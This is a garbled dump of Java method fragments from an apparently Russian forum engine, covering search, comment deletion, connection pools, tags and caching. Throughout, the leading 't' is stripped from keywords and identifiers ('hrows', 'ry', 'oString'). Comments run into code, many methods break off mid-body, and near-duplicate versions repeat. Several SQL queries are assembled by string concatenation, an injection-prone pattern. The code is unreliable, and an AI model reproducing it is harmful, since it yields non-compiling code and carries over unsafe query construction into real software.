postdate<(CURRENT_TIMESTAMP-expire) as expired, message, sections.id as section, NOT topics.sticky AS ssticky " + " FROM topics,groups,users,sections,msgbase " + " WHERE " + where . oString ( ) + " " + " ORDER BY ssticky,commitdate DESC, msgid DESC " + limit ) ; while ( res . next ( ) ) { buf . append ( showCurrent ( db , res ) ) ; } res . close ( ) ; return buf . oString ( ) ; } 
public void copyScreenshot ( Template mpl , String sessionId ) hrows IOException , UtilException , InterruptedException { String mainname = sessionId + " . " + extension ; String iconname = sessionId + " -icon " + " . " + extension ; mainFile = new File ( mpl . getObjectConfig ( ) . getHTMLPathPrefix ( ) + " /gallery/preview " , mainname ) ; iconFile = new File ( mpl . getObjectConfig ( ) . getHTMLPathPrefix ( ) + " /gallery/preview " , iconname ) ; file . renameTo ( mainFile ) ; boolean error = rue ; ry { ImageInfo . resizeImage ( mainFile . getAbsolutePath ( ) , iconFile . getAbsolutePath ( ) ) ; 
public static String detectImageType ( String filename ) hrows BadImageException , IOException { File file = new File ( filename ) ; logger . fine ( " Detecting image type for: " + filename + " ( " + file . length ( ) + " bytes) " ) ; ImageInfo2 ii = new ImageInfo2 ( ) ; FileInputStream is = null ; ry { is = new FileInputStream ( filename ) ; 
public static void resizeImage ( String filename , String iconname ) hrows IOException , UtilException , InterruptedException { String [ ] cmd = { " /usr/bin/convert " , " -scale " , " 150 " , filename , iconname } ; Process proc = Runtime . getRuntime ( ) . exec ( cmd ) ; int exitStatus = proc . waitFor ( ) ; if ( exitStatus ! = 0 ) { hrow new UtilException ( " Can't convert image: convert failed " ) ; 
public String show ( Connection db ) hrows IOException , SQLException , UtilException , UserErrorException { StringBuilder select = new StringBuilder ( " SELECT msgs.id, title, postdate, section, topic, userid, rank(idxFTI, q) as rank, headline(message, q, 'HighlightAll=True') as headline " ) ; if ( include = = SEARCH_ALL ) { select . append ( " FROM msgs_and_cmts as msgs, msgbase, plainto_tsquery(?) as q " ) ; } else { select . append ( " FROM msgs, msgbase, plainto_tsquery(?) as q " ) ; } select . append ( " WHERE msgs.id = msgbase.id AND idxFTI @@ q " ) ; if ( date = = SEARCH_3MONTH ) { select . append ( " AND postdate>CURRENT_TIMESTAMP-'3 month'::interval " ) ; } else if ( date = = SEARCH_YEAR ) { select . append ( " AND postdate>CURRENT_TIMESTAMP-'1 year'::interval " ) ; } if ( section ! = 0 ) { select . append ( " AND section= " ) . append ( section ) ; } if ( username . length ( ) > 0 ) { ry { User user = User . getUser ( db , username ) ; select . append ( " AND userid= " + user . getId ( ) ) ; } catch ( UserNotFoundException ex ) { hrow new UserErrorException ( " User not found: " + username ) ; } } if ( sort = = SORT_DATE ) { select . append ( " ORDER BY postdate DESC " ) ; } else { select . append ( " ORDER BY rank DESC " ) ; } select . append ( " LIMIT 100 " ) ; PreparedStatement pst = null ; ry { pst = db . prepareStatement ( select . oString ( ) ) ; 
private String printResults ( Connection db , ResultSet rs ) hrows SQLException , UserNotFoundException { StringBuilder out = new StringBuilder ( " <h1> </h1> " ) ; out . append ( " <div class= \" messages \" ><div class= \" comment \" > " ) ; while ( rs . next ( ) ) { String itle = rs . getString ( " itle " ) ; int opic = rs . getInt ( " opic " ) ; int id = rs . getInt ( " id " ) ; String headline = rs . getString ( " headline " ) ; Timestamp postdate = rs . getTimestamp ( " postdate " ) ; int userid = rs . getInt ( " userid " ) ; User user = User . getUserCached ( db , userid ) ; String url ; if ( opic = = 0 ) { url = " jump-message.jsp?msgid= " + id ; } else { url = " jump-message.jsp?msgid= " + opic + " &amp;cid= " + id ; } out . append ( " <table width= \" 100% \" cellspacing=0 cellpadding=0 border=0> " ) ; out . append ( " <tr class=body><td> " ) ; out . append ( " <div class=msg> " ) ; out . append ( " <h2><a href= \" " ) . append ( url ) . append ( " \" > " ) . append ( HTMLFormatter . htmlSpecialChars ( itle ) ) . append ( " </a></h2> " ) ; out . append ( " <p> " ) . append ( headline ) . append ( " </p><p> " ) ; out . append ( user . getSignature ( false , postdate ) ) ; out . append ( " </div></td></tr></table><p> " ) ; } out . append ( " </div></div> " ) ; return out . oString ( ) ; } 
public String getVariantID ( ProfileHashtable prof ) hrows UtilException { return " search?q= " + URLEncoder . encode ( query ) + " &include= " + include + " &date= " + date + " &section= " + section + " &sort= " + sort + " &username= " + URLEncoder . encode ( username ) ; } 
String show ( Connection db ) hrows IOException , SQLException , UtilException , UserErrorException ; String getVariantID ( ProfileHashtable prof ) hrows UtilException ; java . util . Date getExpire ( ) ; } 
public static String getViewer ( Viewer viewer , Template mpl , boolean nocache , boolean closeConnection ) hrows UtilException , SQLException , IOException , UserErrorException { return new ViewerCacher ( ) . get ( viewer , mpl , nocache , closeConnection ) ; } 
public String get ( Viewer viewer , Template mpl , boolean nocache , boolean closeConnection ) hrows UtilException , SQLException , IOException , UserErrorException { MemCachedClient mcc = MemCachedSettings . getClient ( ) ; String cacheId = MemCachedSettings . getId ( viewer . getVariantID ( mpl . getProf ( ) ) ) ; String res = null ; if ( ! nocache ) { ime = 0 ; long current = new Date ( ) . getTime ( ) ; res = ( String ) mcc . get ( cacheId ) ; ime = new Date ( ) . getTime ( ) - current ; fromCache = rue ; } if ( res = = null ) { ry { long current = new Date ( ) . getTime ( ) ; Connection db = mpl . getConnection ( " viewer-cacher " ) ; res = viewer . show ( db ) ; ime = new Date ( ) . getTime ( ) - current ; fromCache = false ; } finally { if ( closeConnection ) { mpl . getObjectConfig ( ) . SQLclose ( ) ; } } mcc . add ( cacheId , res , viewer . getExpire ( ) ) ; } return res ; } 
private String deleteReplys ( int msgid , User user , boolean score , int depth ) hrows SQLException { List < Integer > replys = new ArrayList < Integer > ( ) ; StringBuffer out = new StringBuffer ( ) ; st3 . setInt ( 1 , msgid ) ; ResultSet rs = st3 . executeQuery ( ) ; while ( rs . next ( ) ) { int r = rs . getInt ( " id " ) ; replys . add ( r ) ; } rs . close ( ) ; for ( Integer r : replys ) { out . append ( deleteReplys ( r , user , score , depth + 1 ) ) ; out . append ( " " ) . append ( r ) . append ( " <br> " ) ; switch ( depth ) { case 0 : if ( score ) { deleteComment ( r , " 7.1 (, 0) " , user , - 2 ) ; } else { deleteComment ( r , " 7.1 () " , user , 0 ) ; } break ; case 1 : if ( score ) { deleteComment ( r , " 7.1 (, 1) " , user , - 1 ) ; } else { deleteComment ( r , " 7.1 () " , user , 0 ) ; } break ; default : deleteComment ( r , " 7.1 (, >1) " , user , 0 ) ; break ; } } return out . oString ( ) ; } 
public static String showComments ( Connection db , String nick ) hrows SQLException { return showComments ( db , nick , 0 , 0 ) ; } 
public static String showComments ( Connection db , String nick , int offset , int limit ) hrows SQLException { StringBuilder out = new StringBuilder ( ) ; PreparedStatement pst = null ; ry { if ( limit < 1 | | offset < 0 ) { pst = db . prepareStatement ( " SELECT sections.name as ptitle, groups.title as gtitle, topics.title, " + " opics.id as topicid, comments.id as msgid, comments.postdate " + " FROM sections, groups, topics, comments, users " + " WHERE sections.id=groups.section AND groups.id=topics.groupid " + " AND comments.topic=topics.id AND comments.userid=users.id " + " AND users.nick=? AND NOT comments.deleted ORDER BY postdate DESC LIMIT 50 " ) ; } else { pst = db . prepareStatement ( " SELECT sections.name as ptitle, groups.title as gtitle, topics.title, " + " opics.id as topicid, comments.id as msgid, comments.postdate " + " FROM sections, groups, topics, comments, users " + " WHERE sections.id=groups.section AND groups.id=topics.groupid " + " AND comments.topic=topics.id AND comments.userid=users.id " + " AND users.nick=? AND NOT comments.deleted ORDER BY postdate DESC LIMIT " + limit + " OFFSET " + offset ) ; } pst . setString ( 1 , nick ) ; ResultSet rs = pst . executeQuery ( ) ; while ( rs . next ( ) ) { out . append ( " <tr><td> " ) . append ( rs . getString ( " ptitle " ) ) . append ( " </td> " ) ; out . append ( " <td> " ) . append ( rs . getString ( " gtitle " ) ) . append ( " </td> " ) ; out . append ( " <td><a href= \" jump-message.jsp?msgid= " ) . append ( rs . getInt ( " opicid " ) ) . append ( " &amp;cid= " ) . append ( rs . getInt ( " msgid " ) ) . append ( " \" rev=contents> " ) . append ( StringUtil . makeTitle ( rs . getString ( " itle " ) ) ) . append ( " </a></td> " ) ; out . append ( " <td> " ) . append ( Template . dateFormat . format ( rs . getTimestamp ( " postdate " ) ) ) . append ( " </td></tr> " ) ; } rs . close ( ) ; } finally { if ( pst ! = null ) { pst . close ( ) ; } } return out . oString ( ) ; } 
public synchronized Connection getConnection ( String user ) hrows SQLException { if ( db = = null ) { long startMillis = new Date ( ) . getTime ( ) ; db = pool . getConnection ( config ) ; logger.notice("config", "opened connection for '"+user+"'"); long endMillis = new Date().getTime(); dbWaitTime = endMillis - startMillis; } return db; } 
private synchronized void initDataSource ( Properties config ) { if ( dataSource ! = null ) return ; dataSource = new MyDataSource ( ) ; dataSource . setDataSourceName ( " Main pool " ) ; dataSource . setServerName ( " localhost " ) ; dataSource . setDatabaseName ( " linux " ) ; dataSource . setUser ( config . getProperty ( " JDBC_USER " ) ) ; dataSource . setPassword ( config . getProperty ( " JDBC_PASS " ) ) ; dataSource . setMaxConnections ( 10 ) ; dataSource . setInitialConnections ( 10 ) ; } 
private synchronized void initDataSourceWhois ( Properties config ) { if ( dataSourceWhois ! = null ) return ; dataSourceWhois = new MyDataSource ( ) ; dataSourceWhois . setDataSourceName ( " Whois pool " ) ; dataSourceWhois . setServerName ( " localhost " ) ; dataSourceWhois . setDatabaseName ( " linux " ) ; dataSourceWhois . setUser ( config . getProperty ( " JDBC_USER " ) ) ; dataSourceWhois . setPassword ( config . getProperty ( " JDBC_PASS " ) ) ; dataSourceWhois . setMaxConnections ( 4 ) ; dataSourceWhois . setInitialConnections ( 4 ) ; } 
public Connection getConnection ( Properties config ) hrows SQLException { initDataSource ( config ) ; Connection db ; boolean usePool = " TRUE " . equals ( config . getProperty ( " DB_POOL " ) ) ; boolean useJNDI = " JNDI " . equals ( config . getProperty ( " DB_POOL " ) ) ; if ( useJNDI ) { ry { InitialContext cxt = new InitialContext ( ) ; DataSource ds = ( DataSource ) cxt . lookup ( " java:/comp/env/jdbc/lor " ) ; if ( ds = = null ) { hrow new SQLException ( " Data source not found! (java:/comp/env/jdbc/lor) " ) ; } db = ds . getConnection ( ) ; } catch ( NamingException ex ) { hrow new RuntimeException ( ex ) ; } } else if ( usePool ) { db = dataSource . getConnection ( ) ; } else { db = DriverManager . getConnection ( config . getProperty ( " JDBC_URL " ) , config . getProperty ( " JDBC_USER " ) , config . getProperty ( " JDBC_PASS " ) ) ; } return db ; } 
public Connection getConnectionWhois ( Properties config ) hrows SQLException { initDataSourceWhois ( config ) ; Connection db ; boolean usePool = " TRUE " . equals ( config . getProperty ( " DB_POOL " ) ) ; boolean useJNDI = " JNDI " . equals ( config . getProperty ( " DB_POOL " ) ) ; if ( useJNDI ) { ry { InitialContext cxt = new InitialContext ( ) ; DataSource ds = ( DataSource ) cxt . lookup ( " java:/comp/env/jdbc/lor-whois " ) ; if ( ds = = null ) { hrow new SQLException ( " Data source not found! (java:/comp/env/jdbc/lor-whois) " ) ; } db = ds . getConnection ( ) ; } catch ( NamingException ex ) { hrow new RuntimeException ( ex ) ; } } else if ( usePool ) db = dataSourceWhois . getConnection ( ) ; else db = DriverManager . getConnection ( config . getProperty ( " JDBC_URL " ) , config . getProperty ( " JDBC_USER " ) , config . getProperty ( " JDBC_PASS " ) ) ; return db ; } 
public void updateMessageText ( Connection db , String ext ) hrows SQLException { PreparedStatement pst = db . prepareStatement ( " UPDATE msgbase SET message=? WHERE id=? " ) ; pst . setString ( 1 , ext ) ; pst . setInt ( 2 , msgid ) ; pst . executeUpdate ( ) ; } 
public void init ( FilterConfig filterConfig ) { objFilterConfig = filterConfig ; } 
public void doFilter ( ServletRequest req , ServletResponse res , FilterChain filterChain ) hrows IOException , ServletException { if ( isDebugEnabled ) logger . info ( " Doing Filter Cache " ) ; HttpServletResponse response = ( HttpServletResponse ) res ; set the provided HTTP response parameters Enumeration enu = objFilterConfig.getInitParameterNames(); while ( enu.hasMoreElements() ) { String headerName = (String) enu.nextElement(); response.setHeader(headerName,objFilterConfig.getInitParameter(headerName)); RG : use addHeader not setHeader so multiple headers can be added... if (isDebugEnabled) logger.info("Setting Header : " + objFilterConfig.getInitParameter(headerName)); response.addHeader(headerName, objFilterConfig.getInitParameter(headerName)); } pass the request/response on to the rest of the filters filterChain.doFilter(req, response); } 
public String oString ( ) { return VERSION_STRING ; } 
public void destroy ( ) { if ( isDebugEnabled ) logger . info ( " Destroy Cache Filter " ) ; objFilterConfig = null ; } 
private String printResults ( Connection db , ResultSet rs ) hrows SQLException , UserNotFoundException { StringBuilder out = new StringBuilder ( " <h1> </h1> " ) ; out . append ( " <div class= \" messages \" ><div class= \" comment \" > " ) ; while ( rs . next ( ) ) { String itle = rs . getString ( " itle " ) ; int opic = rs . getInt ( " opic " ) ; int id = rs . getInt ( " id " ) ; String headline = rs . getString ( " headline " ) ; Timestamp postdate = rs . getTimestamp ( " postdate " ) ; int userid = rs . getInt ( " userid " ) ; User user = User . getUserCached ( db , userid ) ; String url ; if ( opic = = 0 ) { url = " jump-message.jsp?msgid= " + id ; } else { url = " jump-message.jsp?msgid= " + opic + " &amp;cid= " + id ; } out . append ( " <table width= \" 100% \" cellspacing=0 cellpadding=0 border=0> " ) ; out . append ( " <tr class=body><td> " ) ; out . append ( " <div class=msg> " ) ; out . append ( " <h2><a href= \" " ) . append ( url ) . append ( " \" > " ) . append ( HTMLFormatter . htmlSpecialChars ( itle ) ) . append ( " </a></h2> " ) ; out . append ( " <p> " ) . append ( headline ) . append ( " </p> " ) ; out . append ( " <div class=sign> " ) ; out . append ( user . getSignature ( false , postdate ) ) ; out . append ( " </div> " ) ; out . append ( " </div></td></tr></table><p> " ) ; } out . append ( " </div></div> " ) ; return out . oString ( ) ; } 
public String getVariantID ( ProfileHashtable prof ) hrows UtilException { ry { return " search?q= " + URLEncoder . encode ( query , " koi8-r " ) + " &include= " + include + " &date= " + date + " &section= " + section + " &sort= " + sort + " &username= " + URLEncoder . encode ( username ) ; 
public synchronized Connection getConnection ( String user ) hrows SQLException { if ( db = = null ) { long startMillis = new Date ( ) . getTime ( ) ; db = pool . getConnection ( ) ; logger.notice("config", "opened connection for '"+user+"'"); long endMillis = new Date().getTime(); dbWaitTime = endMillis - startMillis; } return db; } 
public synchronized Connection getConnectionWhois ( ) hrows SQLException { if ( db = = null ) { long startMillis = new Date ( ) . getTime ( ) ; db = pool . getConnectionWhois ( ) ; long endMillis = new Date ( ) . getTime ( ) ; dbWaitTime = endMillis - startMillis ; } return db ; } 
public Connection getConnection ( ) hrows SQLException { Connection db ; ry { InitialContext cxt = new InitialContext ( ) ; DataSource ds = ( DataSource ) cxt . lookup ( " java:/comp/env/jdbc/lor " ) ; if ( ds = = null ) { hrow new SQLException ( " Data source not found! (java:/comp/env/jdbc/lor) " ) ; } db = ds . getConnection ( ) ; } catch ( NamingException ex ) { hrow new RuntimeException ( ex ) ; } return db ; } 
public Connection getConnectionWhois ( ) hrows SQLException { Connection db ; ry { InitialContext cxt = new InitialContext ( ) ; DataSource ds = ( DataSource ) cxt . lookup ( " java:/comp/env/jdbc/lor-whois " ) ; if ( ds = = null ) { hrow new SQLException ( " Data source not found! (java:/comp/env/jdbc/lor-whois) " ) ; } db = ds . getConnection ( ) ; } catch ( NamingException ex ) { hrow new RuntimeException ( ex ) ; } return db ; } 
public String show ( Connection db ) hrows IOException , SQLException , UtilException , UserErrorException { StringBuilder select = new StringBuilder ( " SELECT msgs.id, title, postdate, section, topic, userid, rank(idxFTI, q) as rank, headline(message, q, 'HighlightAll=True') as headline " ) ; if ( include = = SEARCH_ALL ) { select . append ( " FROM msgs_and_cmts as msgs, msgbase, plainto_tsquery(?) as q " ) ; } else { select . append ( " FROM msgs, msgbase, plainto_tsquery(?) as q " ) ; } select . append ( " WHERE msgs.id = msgbase.id AND idxFTI @@ q " ) ; if ( date = = SEARCH_3MONTH ) { select . append ( " AND postdate>CURRENT_TIMESTAMP-'3 month'::interval " ) ; } else if ( date = = SEARCH_YEAR ) { select . append ( " AND postdate>CURRENT_TIMESTAMP-'1 year'::interval " ) ; } if ( section ! = 0 ) { select . append ( " AND section= " ) . append ( section ) ; } if ( username . length ( ) > 0 ) { ry { User user = User . getUser ( db , username ) ; select . append ( " AND userid= " ) . append ( user . getId ( ) ) ; } catch ( UserNotFoundException ex ) { hrow new UserErrorException ( " User not found: " + username ) ; } } if ( sort = = SORT_DATE ) { select . append ( " ORDER BY postdate DESC " ) ; } else { select . append ( " ORDER BY rank DESC " ) ; } select . append ( " LIMIT 100 " ) ; PreparedStatement pst = null ; ry { pst = db . prepareStatement ( select . oString ( ) ) ; 
private String printResults ( Connection db , ResultSet rs ) hrows SQLException , UserNotFoundException { StringBuilder out = new StringBuilder ( " <h1> </h1> " ) ; out . append ( " <div class= \" messages \" ><div class= \" comment \" > " ) ; while ( rs . next ( ) ) { String itle = rs . getString ( " itle " ) ; int opic = rs . getInt ( " opic " ) ; int id = rs . getInt ( " id " ) ; String headline = rs . getString ( " headline " ) ; Timestamp postdate = rs . getTimestamp ( " postdate " ) ; int userid = rs . getInt ( " userid " ) ; User user = User . getUserCached ( db , userid ) ; String url ; if ( opic = = 0 ) { url = " view-message.jsp?msgid= " + id ; } else { url = " jump-message.jsp?msgid= " + opic + " &amp;cid= " + id ; } out . append ( " <table width= \" 100% \" cellspacing=0 cellpadding=0 border=0> " ) ; out . append ( " <tr class=body><td> " ) ; out . append ( " <div class=msg> " ) ; out . append ( " <h2><a href= \" " ) . append ( url ) . append ( " \" > " ) . append ( HTMLFormatter . htmlSpecialChars ( itle ) ) . append ( " </a></h2> " ) ; out . append ( " <p> " ) . append ( headline ) . append ( " </p> " ) ; out . append ( " <div class=sign> " ) ; out . append ( user . getSignature ( false , postdate ) ) ; out . append ( " </div> " ) ; out . append ( " </div></td></tr></table><p> " ) ; } out . append ( " </div></div> " ) ; return out . oString ( ) ; } 
public boolean containsLink ( ) { return havelink ; } 
public Connection getConnection ( String user ) hrows SQLException { return config . getConnection ( user ) ; } 
public String getBanner ( ) hrows SQLException { Connection db = config . getConnection ( ) ; Statement st = db . createStatement ( ) ; ResultSet rs = st . executeQuery ( " SELECT id, banner FROM banners WHERE today>0 AND total>0 ORDER BY total DESC LIMIT 1 " ) ; if ( ! rs . next ( ) ) { return " " ; } String banner = rs . getString ( " banner " ) ; int id = rs . getInt ( " id " ) ; rs . close ( ) ; st . executeUpdate ( " UPDATE banners SET total=total-1,today=today-1 WHERE id= " + id ) ; return ( " <a href= \" /forward.jsp?id= " + id + " \" ><img src= \" " + banner + " \" width= " + width + " height= " + height + " alt=adv border=0></a> " ) ; } 
public synchronized Connection getConnection ( ) hrows SQLException { if ( db = = null ) { long startMillis = new Date ( ) . getTime ( ) ; db = pool . getConnection ( ) ; logger.notice("config", "opened connection for '"+user+"'"); long endMillis = new Date().getTime(); dbWaitTime = endMillis - startMillis; } return db; } 
public Connection getConnection ( ) hrows SQLException { return config . getConnection ( ) ; } 
public String get ( Viewer viewer , Template mpl , boolean nocache , boolean closeConnection ) hrows UtilException , SQLException , IOException , UserErrorException { MemCachedClient mcc = MemCachedSettings . getClient ( ) ; String cacheId = MemCachedSettings . getId ( viewer . getVariantID ( mpl . getProf ( ) ) ) ; String res = null ; if ( ! nocache ) { ime = 0 ; long current = new Date ( ) . getTime ( ) ; res = ( String ) mcc . get ( cacheId ) ; ime = new Date ( ) . getTime ( ) - current ; fromCache = rue ; } if ( res = = null ) { ry { long current = new Date ( ) . getTime ( ) ; Connection db = mpl . getConnection ( ) ; res = viewer . show ( db ) ; ime = new Date ( ) . getTime ( ) - current ; fromCache = false ; } finally { if ( closeConnection ) { mpl . getObjectConfig ( ) . SQLclose ( ) ; } } mcc . add ( cacheId , res , viewer . getExpire ( ) ) ; } return res ; } 
public String getContentImpl ( ProfileHashtable profile ) hrows IOException , SQLException , BadDateException { Connection db = null ; ry { db = ( ( SQLConfig ) config ) . getConnection ( ) ; 
public String getContentImpl ( ProfileHashtable profile ) hrows IOException , SQLException { Connection db = null ; ry { db = ( ( SQLConfig ) config ) . getConnection ( ) ; 
public String getContentImpl ( ProfileHashtable profile ) hrows SQLException , UtilException { Connection db = null ; ry { db = ( ( SQLConfig ) config ) . getConnection ( ) ; 
public String getContentImpl ( ProfileHashtable profile ) hrows IOException , SQLException , UtilException { Connection db = null ; ry { db = ( ( SQLConfig ) config ) . getConnection ( ) ; 
Connection getConnection ( ) hrows SQLException ; void SQLclose ( ) hrows SQLException ; } 
public static String URLEncoder ( String str ) { ry { StringBuffer buf = new StringBuffer ( ) ; 
private String formatHTMLLine ( String chunk ) hrows UtilException { StringBuffer out = new StringBuffer ( ) ; REMatchEnumeration en = urlRE . getMatchEnumeration ( chunk ) ; int index = 0 ; while ( en . hasMoreElements ( ) ) { REMatch found = en . nextMatch ( ) ; out.append("<a href=\"" + URLEncoder(url) + "\">" + urlchunk + "</a>"); } else { out.append(url); } index = found.getEndIndex(); } if (index < chunk.length()) { out.append(wrapLongLine(chunk.substring(index), maxlength, nl, index)); } return out.toString(); } 
public static String showComments ( Connection db , String nick ) hrows SQLException { return showComments ( db , nick , 0 , 0 ) ; } 
public void addNick ( Connection db , String nick ) hrows SQLException , UserNotFoundException , AccessViolationException { User user = User . getUser ( db , nick ) ; int id = user . getId ( ) ; if ( user . canModerate ( ) ) { hrow new AccessViolationException ( " " ) ; 
public String deleteAllComments ( Connection db , User moderator ) hrows SQLException { Statement st = null ; ResultSet rs = null ; CommentDeleter deleter = null ; StringBuilder out = new StringBuilder ( ) ; ry { Delete user topics PreparedStatement lock = db.prepareStatement("SELECT id FROM topics WHERE userid=? AND not deleted FOR UPDATE"); PreparedStatement st1 = db.prepareStatement("UPDATE topics SET deleted='t',sticky='f' WHERE id=?"); PreparedStatement st2 = db.prepareStatement("INSERT INTO del_info (msgid, delby, reason) values(?,?,?)"); lock.setInt(1, id); st2.setInt(2,moderator.getId()); st2.setString(3,": "); ResultSet lockResult = lock.executeQuery(); lock another delete on this row while (lockResult.next()) { int mid = lockResult.getInt("id"); st1.setInt(1,mid); st2.setInt(1,mid); st1.executeUpdate(); st2.executeUpdate(); } st1.close(); st2.close(); lockResult.close(); lock.close(); Delete user comments deleter = new CommentDeleter(db); st = db.createStatement(); rs = st.executeQuery("SELECT id FROM comments WHERE userid="+id+" AND not deleted ORDER BY id DESC FOR update"); while(rs.next()) { int msgid = rs.getInt("id"); out.append(" #").append(msgid).append("<br>"); out.append(deleter.deleteReplys(msgid, moderator, true)); out.append(deleter.deleteComment(msgid, "4.7 Flood (auto)", moderator, -20)); out.append("<br>"); } } finally { if (deleter!=null) { deleter.close(); } if (rs!=null) { rs.close(); } if (st!=null) { st.close(); } } return out.toString(); } 
private String formatHTMLLine ( String chunk ) hrows UtilException { StringBuffer out = new StringBuffer ( ) ; REMatchEnumeration en = urlRE . getMatchEnumeration ( chunk ) ; int index = 0 ; while ( en . hasMoreElements ( ) ) { REMatch found = en . nextMatch ( ) ; URL out.append(wrapLongLine(chunk.substring(index, found.getStartIndex()), maxlength, nl, index)); URL String url = chunk.substring(found.getStartIndex(), found.getEndIndex()); if (urlHighlight) { String urlchunk = url; if (url.toLowerCase().startsWith("www.")) { url = "http:" + url; } else if (url.toLowerCase().startsWith("ftp.")) { url = "ftp:" + url; } if (Preformat) { urlchunk = wrapLongLine(urlchunk, maxlength, nl, found.getStartIndex()); } else if (urlchunk.length() > maxlength) { urlchunk = urlchunk.substring(0, maxlength - 3) + "..."; } out.append("<a href=\"").append(URLEncoder(url)).append("\">").append(urlchunk).append("</a>"); } else { out.append(url); } index = found.getEndIndex(); } if (index < chunk.length()) { out.append(wrapLongLine(chunk.substring(index), maxlength, nl, index)); } return out.toString(); } 
public static String wrapLongLine ( String line , int maxlength , String delim , int start ) { StringBuffer sb = new StringBuffer ( ) ; int index = start ; for ( Iterator i = new SGMLStringIterator ( line ) ; i . hasNext ( ) ; ) { String ch = ( String ) i . next ( ) ; if ( index % maxlength = = maxlength - 1 ) { sb . append ( delim ) ; } sb . append ( ch ) ; index + + ; } return sb . oString ( ) ; } 
public String show ( Connection db ) hrows IOException , SQLException , UtilException { StringBuffer buf = new StringBuffer ( ) ; Statement st = db . createStatement ( ) ; StringBuilder where = new StringBuilder ( " sections.id=groups.section AND topics.id=msgbase.id AND topics.userid=users.id " + " AND topics.groupid=groups.id AND NOT deleted " ) ; if ( ! viewAll ) { where . append ( " AND (topics.moderate OR NOT sections.moderate) " ) ; } else { where . append ( " AND (NOT topics.moderate) AND sections.moderate " ) ; } if ( section ! = 0 ) { where . append ( " AND section= " ) . append ( section ) ; } if ( group ! = 0 ) { where . append ( " AND groupid= " ) . append ( group ) ; } if ( datelimit ! = null ) { where . append ( " AND " ) . append ( datelimit ) ; } if ( ag ! = null & & ! " " . equals ( ag ) ) { PreparedStatement pst = db . prepareStatement ( " SELECT id FROM tags_values WHERE value=? " ) ; pst . setString ( 1 , ag ) ; ResultSet rs = pst . executeQuery ( ) ; if ( rs . next ( ) ) { int agid = rs . getInt ( " id " ) ; if ( agid > 0 ) { where . append ( " AND topics.id IN (SELECT msgid FROM tags WHERE tagid= " ) . append ( agid ) . append ( " ) " ) ; } } rs . close ( ) ; pst . close ( ) ; } ResultSet res = st . executeQuery ( " SELECT topics.title as subj, topics.lastmod, topics.stat1, postdate, nick, image, " + " groups.title as gtitle, topics.id as msgid, sections.comment, groups.id as guid, " + " opics.url, topics.linktext, imagepost, vote, sections.name as pname, linkup, " + " postdate<(CURRENT_TIMESTAMP-expire) as expired, message, sections.id as section, NOT topics.sticky AS ssticky " + " FROM topics,groups,users,sections,msgbase " + " WHERE " + where . oString ( ) + " " + " ORDER BY ssticky,commitdate DESC, msgid DESC " + limit ) ; while ( res . next ( ) ) { buf . append ( showCurrent ( db , res ) ) ; } res . close ( ) ; return buf . oString ( ) ; } 
public String getVariantID ( ProfileHashtable prof ) hrows UtilException { StringBuilder id = new StringBuilder ( " view-news? " + " opics= " + prof . getInt ( " opics " ) + " &messages= " + prof . getInt ( " messages " ) + " &style= " + prof . getString ( " style " ) + " &tag= " + ag ) ; if ( viewAll ) { id . append ( " &view-all=true " ) ; } if ( section ! = 0 ) { id . append ( " &section= " ) . append ( section ) ; } if ( group ! = 0 ) { id . append ( " &group= " ) . append ( group ) ; } if ( datelimit ! = null ) { id . append ( " &datelimit= " ) . append ( URLEncoder . encode ( datelimit ) ) ; } if ( limit ! = null & & limit . length ( ) > 0 ) { id . append ( " &limit= " ) . append ( URLEncoder . encode ( limit ) ) ; } return id . oString ( ) ; } 
private static synchronized int getOrCreateTag ( Connection con , String ag ) hrows SQLException { PreparedStatement st2 = con . prepareStatement ( " SELECT id FROM tags_values WHERE value=? " ) ; st2 . setString ( 1 , ag ) ; ResultSet rs = st2 . executeQuery ( ) ; int id ; if ( rs . next ( ) ) { id = rs . getInt ( " id " ) ; } else { PreparedStatement st = con . prepareStatement ( " INSERT INTO tags_values (value) VALUES(?) " ) ; st . setString ( 1 , ag ) ; st . executeUpdate ( ) ; st . close ( ) ; rs = st2 . executeQuery ( ) ; rs . next ( ) ; id = rs . getInt ( " id " ) ; } rs . close ( ) ; st2 . close ( ) ; return id ; } 
public String oString ( ) { String str = " " ; if ( ags = = null | | ags . isEmpty ( ) ) { return " " ; } for ( String ag : ags ) { str + = ( str . length ( ) > 0 ? " , " : " " ) + ag ; } return str ; } 
public static Map < Integer , String > getCloud ( Connection con ) hrows SQLException { Map < Integer , String > cloud = new HashMap < Integer , String > ( ) ; PreparedStatement st = con . prepareStatement ( " SELECT counter,value FROM tags_values ORDER BY counter DESC LIMIT 10 " ) ; ResultSet rs = st . executeQuery ( ) ; while ( rs . next ( ) ) { cloud . put ( rs . getInt ( " counter " ) , rs . getString ( " value " ) ) ; } return cloud ; } 
public static ArrayList < String > getMessageTags ( Connection con , int msgid ) hrows SQLException { return new Tags ( con , msgid ) . getTags ( ) ; } 
public static void checkTag ( String ag ) hrows UserErrorException { : , , , <> if (!tagRE.isMatch(tag)) { throw new UserErrorException("Invalid tag: '"+tag+"'"); 
public static void updateTags ( Connection con , int msgid , String ags , boolean moderate ) hrows SQLException , UserErrorException { Set < String > agSet = new HashSet < String > ( ) ; tags = tags.replaceAll("\\|",","); String [] tagsArr = tags.split(","); if (tagsArr.length==0) { return; } for (int i = 0; i < tagsArr.length; i++) { String tag = StringUtils.stripToNull(tagsArr[i].toLowerCase()); - if (tag==null) { continue; } : , , , <> checkTag(tag); tagSet.add(tag); } PreparedStatement st1 = con.prepareStatement("SELECT tagid FROM tags WHERE msgid=? AND tagid=?"); PreparedStatement st2 = con.prepareStatement("INSERT INTO tags VALUES(?,?)"); PreparedStatement st3 = con.prepareStatement("UPDATE tags_values SET counter=counter+1 WHERE id=?"); st1.setInt(1, msgid); st2.setInt(1, msgid); for (String tag : tagSet) { tags_values / id int id = getOrCreateTag(con, tag); tags ? st1.setInt(2,id); ResultSet rs = st1.executeQuery(); if (!rs.next()) { - st2.setInt(2,id); st2.executeUpdate(); } rs.close(); ? if (moderate) { st3.setInt(1,id); st3.executeUpdate(); } } st3.close(); st2.close(); st1.close(); } 
public static String getPlainTags ( Connection con , int msgid ) hrows SQLException { return new Tags ( con , msgid ) . oString ( ) ; } 
